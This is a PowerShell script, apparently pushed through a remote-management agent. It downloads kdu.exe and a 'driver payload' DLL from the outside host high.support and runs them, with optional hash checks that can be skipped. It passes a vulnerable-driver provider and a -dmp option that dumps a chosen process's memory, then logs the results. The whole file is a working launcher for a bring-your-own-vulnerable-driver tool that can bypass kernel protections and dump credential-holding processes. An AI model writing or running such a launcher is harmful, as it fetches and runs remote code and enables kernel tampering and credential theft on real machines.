param(
    [string]$KduUrl = "https://high.support/files/kdu/kdu.exe",
    [string]$HashUrl = "https://high.support/files/kdu/kdu.exe.sha256",
    [string]$DriverUrl = "https://high.support/files/kdu/drv64.dll",
    [string]$DriverHashUrl = "https://high.support/files/kdu/drv64.dll.sha256",
    [string]$WorkingRoot = "$env:ProgramData\MeshKDU",
    [string]$Arguments = "",
    [Nullable[int]]$Pid,
    [Nullable[int]]$Provider = 1,
    [string]$RunLabel = "",
    [switch]$Keep = $true,
    [switch]$SkipHash
)

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Write-Info {
    param([string]$Message)
    Write-Host "[+] $Message"
}

function Ensure-Directory {
    param([string]$Path)
    if (-not (Test-Path -Path $Path)) {
        New-Item -ItemType Directory -Path $Path -Force | Out-Null
    }
}

function Get-ExpectedHash {
    param([string]$HashFile)
    if (-not (Test-Path -Path $HashFile)) { return $null }
    $line = Get-Content -Path $HashFile | Where-Object { $_ -match '^[0-9a-fA-F]{64}' } | Select-Object -First 1
    if (-not $line) { return $null }
    return ($line -split '\s+')[0].ToLowerInvariant()
}

if ([string]::IsNullOrWhiteSpace($RunLabel)) {
    $RunLabel = (Get-Date).ToString("yyyyMMdd-HHmmss")
}

Ensure-Directory -Path $WorkingRoot

$RunRoot = Join-Path -Path $WorkingRoot -ChildPath $RunLabel
Ensure-Directory -Path $RunRoot

$KduPath = Join-Path -Path $RunRoot -ChildPath "kdu.exe"
$HashPath = Join-Path -Path $RunRoot -ChildPath "kdu.exe.sha256"
$DriverPath = Join-Path -Path $RunRoot -ChildPath "drv64.dll"
$DriverHashPath = Join-Path -Path $RunRoot -ChildPath "drv64.dll.sha256"
$StdOutPath = Join-Path -Path $RunRoot -ChildPath "stdout.txt"
$StdErrPath = Join-Path -Path $RunRoot -ChildPath "stderr.txt"
$LogPath = Join-Path -Path $RunRoot -ChildPath "kdu-summary.txt"

Write-Info "Run folder: $RunRoot"
Write-Info "Downloading kdu.exe from $KduUrl"
Invoke-WebRequest -Uri $KduUrl -OutFile $KduPath -UseBasicParsing

if (-not $SkipHash -and -not [string]::IsNullOrWhiteSpace($HashUrl)) {
    Write-Info "Downloading SHA256 hash from $HashUrl"
    Invoke-WebRequest -Uri $HashUrl -OutFile $HashPath -UseBasicParsing
    $ExpectedHash = Get-ExpectedHash -HashFile $HashPath
    if ($ExpectedHash) {
        $ActualHash = (Get-FileHash -Path $KduPath -Algorithm SHA256).Hash.ToLowerInvariant()
        if ($ActualHash -ne $ExpectedHash) {
            throw "Hash mismatch: expected $ExpectedHash but got $ActualHash"
        }
        Write-Info "SHA256 verified: $ActualHash"
    } else {
        Write-Warning "Could not parse expected hash value for kdu.exe; continuing without verification."
    }
} elseif ($SkipHash) {
    Write-Warning "Skipping hash validation per request."
}

if (-not [string]::IsNullOrWhiteSpace($DriverUrl)) {
    Write-Info "Downloading driver payload from $DriverUrl"
    Invoke-WebRequest -Uri $DriverUrl -OutFile $DriverPath -UseBasicParsing

    if (-not $SkipHash -and -not [string]::IsNullOrWhiteSpace($DriverHashUrl)) {
        Write-Info "Downloading driver hash from $DriverHashUrl"
        Invoke-WebRequest -Uri $DriverHashUrl -OutFile $DriverHashPath -UseBasicParsing
        $ExpectedDriverHash = Get-ExpectedHash -HashFile $DriverHashPath
        if ($ExpectedDriverHash) {
            $ActualDriverHash = (Get-FileHash -Path $DriverPath -Algorithm SHA256).Hash.ToLowerInvariant()
            if ($ActualDriverHash -ne $ExpectedDriverHash) {
                throw "Driver hash mismatch: expected $ExpectedDriverHash but got $ActualDriverHash"
            }
            Write-Info "Driver SHA256 verified: $ActualDriverHash"
        } else {
            Write-Warning "Could not parse expected hash value for driver; continuing without verification."
        }
    }
}

if ([string]::IsNullOrWhiteSpace($Arguments)) {
    $argBuilder = @()
    if ($Provider -ne $null) {
        $argBuilder += "-prv"
        $argBuilder += $Provider
    }
    if ($Pid -ne $null) {
        $argBuilder += "-dmp"
        $argBuilder += $Pid
    }
    $Arguments = ($argBuilder -join " ").Trim()
}

if ([string]::IsNullOrWhiteSpace($Arguments)) {
    Write-Warning "No KDU arguments provided; running without parameters."
}

Write-Info "Executing kdu.exe $Arguments"

$startTime = Get-Date
Push-Location -Path $RunRoot
try {
    $process = Start-Process -FilePath $KduPath `
        -ArgumentList $Arguments `
        -WorkingDirectory $RunRoot `
        -NoNewWindow `
        -PassThru `
        -Wait `
        -RedirectStandardOutput $StdOutPath `
        -RedirectStandardError $StdErrPath
} finally {
    Pop-Location
}
$endTime = Get-Date

$StdOut = if (Test-Path $StdOutPath) { Get-Content -Path $StdOutPath -ErrorAction SilentlyContinue } else { @() }
$StdErr = if (Test-Path $StdErrPath) { Get-Content -Path $StdErrPath -ErrorAction SilentlyContinue } else { @() }

$summary = @()
$summary += "KDU execution summary"
$summary += "====================="
$summary += "Started : $startTime"
$summary += "Finished: $endTime"
$summary += "Arguments: $Arguments"
$summary += "ExitCode : $($process.ExitCode)"
$summary += ""
$summary += "STDOUT"
$summary += "------"
$summary += $StdOut
$summary += ""
$summary += "STDERR"
$summary += "------"
$summary += $StdErr
$summary | Set-Content -Path $LogPath

Write-Info "Exit code: $($process.ExitCode)"
Write-Info "Stdout log : $StdOutPath"
Write-Info "Stderr log : $StdErrPath"
Write-Info "Summary log: $LogPath"

if (-not $Keep) {
    Write-Info "Cleaning up run folder $RunRoot"
    Remove-Item -Path $RunRoot -Recurse -Force -ErrorAction SilentlyContinue
} else {
    Write-Info "Artifacts kept under $RunRoot"
}
